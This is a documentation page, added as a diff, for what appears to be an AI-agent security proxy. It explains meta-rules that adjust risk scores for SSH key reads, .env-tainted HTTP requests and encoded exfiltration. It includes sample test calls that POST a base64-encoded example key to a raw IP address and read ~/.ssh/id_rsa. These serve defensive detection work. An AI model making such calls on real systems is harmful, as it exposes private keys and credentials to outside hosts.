@@ -1,0 +1,132 @@
+---
+title: 'Meta-rules'
+description: 'Five rules that adjust the composite once, after phase 3, when a specific combination of filters fired.'
+section: 'filters'
+order: 19
+tier: 'community'
+version: '0.3.1'
+lastUpdated: '2026-08-24'
+editUrl: 'https://github.com/grith-ai/grith-docs/edit/main/content/docs/filters/meta-rules.mdx'
+---
+
+A filter sees one thing. A meta-rule sees the whole set of filter results and adjusts the
+composite when a specific combination fired. They run **once, after phase 3**, and the
+adjustment is the last thing that happens before the decision is routed.
+
+Five ship. Every one requires **all** of its conditions.
+
+| Rule | Effect | Fires when |
+| --- | --- | --- |
+| `ssh-key-access` | sets the score to exactly **8.0** | `path-match` matched with `rule_id = "ssh-private-key"` |
+| `env-exfiltration-risk` | **+5.0** | `taint` matched with source `env-file` **and** the call is an `HttpRequest` |
+| `exfil-shape-to-low-reputation` | **+2.5** | a filter set the `exfil_shape` flag **and** `reputation` matched |
+| `exfil-shape-under-session-taint` | **+2.0** | a filter set the `exfil_shape` flag **and** `taint` matched |
+| `npm-dependency-resolution` | **-3.0** | `path-match` matched `rule_id = "package-json"` **and** the call is a `DirList` under `node_modules` |
+
+## The exfil-shape pair
+
+`exfil_shape` is set by [egress-policy](/docs/filters/10-egress-policy) when a payload looks
+encoded - a long base64 run, a high-entropy segment, an over-long URL or argument list - and
+that shape rides a real destination. The score for the shape is only added for an *untrusted*
+destination, but the flag is set either way, so these two rules can escalate a shaped payload
+to a host that looks fine on its own but is corroborated by reputation or by session taint.
+
+A shaped URL to a known-safe host sets no flag at all, so neither rule fires on the happy path.
+
+The arithmetic is visible in real output. Here the filter lines add to 7.5, which would queue -
+the composite is 10.0 because `exfil-shape-to-low-reputation` added 2.5:
+
+<Terminal>
+{`$ grith proxy test '{"type":"HttpRequest","method":"POST","url":"https://45.33.32.156/u?d=QUtJQUlPU0ZPRE5ON0VYQU1QTEVhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODk="}'
+
+  Score:       10.0
+  Decision:    DENY
+
+  Filter Breakdown:
+    + operation-risk         1.0  [notice]  HTTP POST request (carries body): https://45.33.32.156/u?d=QUtJQUlPU0ZPRE5ON0VYQU1QTEVhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODk=
+    + egress-policy          3.5  [warning]  Unknown outbound destination from http_request: 45.33.32.156
+    + reputation             3.0  [warning]  Raw IP address destination: 45.33.32.156
+
+  Exit code:   2 (deny)`}
+</Terminal>
+
+## An override is not an adjustment
+
+`ssh-key-access` uses `score_override`, and that behaves differently from the other four in
+two ways worth knowing:
+
+1. **It replaces the composite rather than adding to it.** Whatever the filters summed to, the
+   score becomes exactly 8.0.
+2. **It short-circuits the loop.** Once it fires, no later meta-rule is evaluated at all.
+
+8.0 is not greater than 8.0, so the call **queues**. That is the point: direct access to an
+SSH private key is pinned to a human decision rather than either allowed or refused outright.
+
+## Early termination means most SSH reads never reach it
+
+On a stock install, a read of `~/.ssh/id_rsa` scores 5.0 from `path-match` plus 4.0 from
+`sensitive-path-heuristic` - 9.0 at the end of phase 1, which is already past the deny line.
+The call is denied there, phases 2 and 3 never run, and the meta-rules never run either.
+
+The rule bites when something has pulled phase 1 back under 8.0 - an
+[allowlist](/docs/filters/04-allowlist-denylist) entry for the path, for instance. Then the
+pipeline runs to completion and the override pins the result at 8.0:
+
+<Terminal>
+{`$ grith proxy test '{"type":"FileRead","path":"/home/u/.ssh/id_rsa"}'
+
+  Score:       8.0
+  Decision:    QUEUE (Critical)
+
+  Filter Breakdown:
+    + path-match             5.0  [critical]  Access to SSH private key
+    + sensitive-path-heuristic   4.0  [error]  read access to key/certificate file
+    + allowlist             -1.0  [notice]  Path matches allowlist: */.ssh/id_rsa
+
+  Exit code:   1 (queue (critical))`}
+</Terminal>
+
+## The npm rule is inert as shipped
+
+`npm-dependency-resolution` needs `path-match` to have matched a rule with the id
+`package-json`. No such rule exists in the shipped `paths.toml`, so on a stock install the rule
+never fires. It only becomes live if you add a `package-json` rule of your own.
+
+## Two rules were removed, deliberately
+
+Two `*-filename-single-signal` rules used to subtract 1.5 when a weak filename was the only
+evidence. They composed with a de-weighting already applied in `paths.toml`, and together the
+two subtractions landed a read of `secrets.yaml` on exactly 2.80 - which the router **allows**,
+because it routes on `score > 3.0`. A Kubernetes secret manifest was readable with no prompt.
+
+The fix was structural rather than another weight: the weak `*credentials*` and `*secrets*`
+globs were deleted from `paths.toml`, `sensitive-path-heuristic` now prices a credential
+filename exactly once, and both meta-rules went with them. Do not re-add them.
+
+## Writing your own
+
+<ConfigExample title="config/filters/meta_rules.toml" code={`[[meta_rules]]
+id = "env-exfiltration-risk"
+score_adjustment = 5.0
+message = "Potential credential exfiltration after .env read"
+
+[[meta_rules.conditions]]
+filter = "taint"
+taint_source = "env-file"
+
+[[meta_rules.conditions]]
+call_type = "HttpRequest"
+`} />
+
+A condition can test `filter`, `rule_id`, `matched`, `call_type`, `path_contains`,
+`taint_source` and `metadata_flag`. A rule carries either `score_adjustment` or
+`score_override`.
+
+`meta_rules.toml` is required - the daemon will not start without a copy it can parse, from
+disk or from the one embedded in the binary. Legacy snake_case filter names in a `filter =`
+condition are normalised on read, so `operation_risk` still matches `operation-risk`.
+
+## See also
+
+- [Filter overview](/docs/filters/overview) - the 18 filters these read
+- [Composite scoring](/docs/concepts/composite-scoring) - what the adjusted score routes into
